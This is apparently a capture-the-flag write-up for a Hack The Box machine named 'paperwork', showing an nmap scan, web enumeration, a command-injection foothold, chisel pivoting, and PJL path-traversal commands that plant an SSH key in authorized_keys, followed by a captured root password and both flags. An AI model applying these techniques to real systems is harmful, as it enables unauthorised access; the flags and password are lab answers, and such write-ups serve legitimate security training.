# Discover
```sh
# Nmap 7.80 scan initiated Fri Nov 20 10:57:06 2026 as: nmap -sV -p- --min-rate 1000 -oN nmap.txt 10.129.155.58
Nmap scan report for 10.129.155.58
Host is up (0.024s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.80%I=7%D=11/20%Time=6B0019B1%P=x86_64-pc-linux-gnu%r(T
SF:erminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printi
SF:ng\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20
SF:printing\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 20 10:58:12 2026 -- 1 IP address (1 host up) scanned in 65.66 seconds
```

## HTML exposes an archive to download
```html
󰣇 ~/hackthebox/htb-paperwork ❯ curl -i http://10.129.214.48/                3.14.8  23:45 
HTTP/1.1 301 Moved Permanently
Server: nginx/1.28.0 (Ubuntu)
Date: Fri, 20 Nov 2026 22:45:22 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://paperwork.htb/

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.28.0 (Ubuntu)</center>
</body>
</html>
󰣇 ~/hackthebox/htb-paperwork ❯ cat /etc/hosts                               3.14.8  23:45 
# Static table lookup for hostnames.
# See hosts(5) for details.
127.0.0.1        localhost
󰣇 ~/hackthebox/htb-paperwork ❯ curl -i http://paperwork.htb/                3.14.8  23:46 
HTTP/1.1 200 OK
Server: nginx/1.28.0 (Ubuntu)
Date: Fri, 20 Nov 2026 22:46:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2844
Connection: keep-alive


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Intranet | Document Archiving Service</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #eef2f5; 
            color: #333;
            margin: 0;
            padding: 0;
        }
        .header {
            background: #2c3e50;
            color: white;
            padding: 15px 40px;
            border-bottom: 4px solid #1a252f;
        }
        .container { 
            max-width: 900px;
            margin: 40px auto;
            background: white; 
            padding: 40px; 
            border: 1px solid #d1d9e0; 
            border-radius: 3px;
        }
        .alert-box {
            background: #fff3cd;
            border-left: 5px solid #ffecb5;
            padding: 15px;
            margin-bottom: 30px;
            color: #856404;
            font-size: 0.9em;
        }
        h1 { font-size: 1.8em; margin-top: 0; }
        h2 { font-size: 1.2em; color: #2c3e50; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .info-table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        .info-table td { padding: 12px; border-bottom: 1px solid #f0f0f0; }
        .info-table td:first-child { font-weight: bold; width: 30%; color: #666; }
        .footer { margin-top: 40px; font-size: 0.8em; color: #999; text-align: center; }
        a { color: #0056b3; text-decoration: none; }
    </style>
</head>
<body>
    <div class="header">
        <strong>Corporate Systems:</strong> Department of Records & Archives
    </div>

    <div class="container">
        <h1>Intake Portal</h1>
        
        <div class="alert-box">
            <strong>Maintenance Advisory:</strong> Backend spooler <code>PRN-ARCHIVE-01</code> management console is currently offline. Manual ingestion remains active via the legacy gateway. 
        </div>

        <h2>System Configuration</h2>
        <table class="info-table">
            <tr>
                <td>Protocol</td>
                <td><code>Compliance Level: RFC 1179</code></td>
            </tr>
            <tr>
                <td>Target Queue</td>
                <td><code>archive_intake</code></td>
            </tr>
            <tr>
                <td>Internal Processor</td>
                <td><a href="/download/archive"><code>paperwork-archive-v1.02</code></a>
            </tr>

        </table>

        <h2>Usage Notice</h2>
        <p>Remote job submission must conform to business requirements for archival indexing. Submissions without a valid identifier will fail to process through the legacy intake processor.</p>

        <div class="footer">
            Internal Use Only &copy; 2026 Corporate Digital Archiving Solutions v1.02
        </div>
    </div>
</body>
```

# Initial Foothold
## Looking into `paperwork-archive-v1.02.zip`
In the zip file, i found a `server.py`
The `server.py` has a Command Injection vulnerability, for the LdpServer.
Using the written `exploit.py`, we can get a reverse shell into the system.

## Found a system service, named `jetdirect.service`
The service uses the Port `9100`.
```sh
# /etc/systemd/system/jetdirect.service
[Unit]
Description=jetdirect server
After=jetdirect.service
Requires=jetdirect.service

[Service]
Type=simple
User=archivist
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer>
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

## Pivoting with `chisel`
By setting up a `chisel server` (Attacker) and `chisel client` (Victim), we can use `netcat` to connect to the Service and send commands


## Adding `authorized_keys` for `archivist`
```
@PJL FSDOWNLOAD NAME="0:\..\.ssh\authorized_keys" SIZE=99
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlPpE7HfnsYTu2o7zu1bKMqwbOYHmUg6GlHxvDqbjdw wiseman@0xwis3m4n
OK
@PJL FSUPLOAD NAME="0:\..\.ssh\authorized_keys" OFFSET=0 SIZE=4096
@PJL FSUPLOAD NAME="0:\..\.ssh\authorized_keys" SIZE=99
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGlPpE7HfnsYTu2o7zu1bKMqwbOYHmUg6GlHxvDqbjdw wiseman@0xwis3m4n
@PJL FSDIRLIST NAME="0:\..\.ssh" ENTRY=1 COUNT=100
. TYPE=DIR
.. TYPE=DIR
authorized_keys TYPE=FILE SIZE=99
```

## Connecting with generated ssh private_key
```
ssh -i paperwork archivist@10.129.214.48
```

# Found user.txt
```sh
archivist@paperwork:~$ ls
printer  user.txt
archivist@paperwork:~$ cat user.txt 
297361c824f089028c917672cd3a1f06
```

# Privilege Escalation
Using the `socket-listener.py`, i was able to get the password for root
```sh
archivist@paperwork:~$ python3 t.py 
Message: ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
Flags: 0
Control level: 1
Control type: 1
Control payload size: 8
SCM_RIGHTS Payload: b'\x04\x00\x00\x00\x05\x00\x00\x00'
Payload Length: 8
Command: @PJL FSUPLOAD NAME="0:\..\.ssh\authorized_keys" OFFSET=0 SIZE=4096

ADMIN_PASSWORD=ApparelMortuaryCedar22

archivist@paperwork:~$ su root
Password: 
```

# Found root.txt
```sh
root@paperwork:~# ls
quarantine  root.txt  staging
root@paperwork:~# cat root.txt 
be60681e9ddedb5c3e4b04f73ee726c7
```
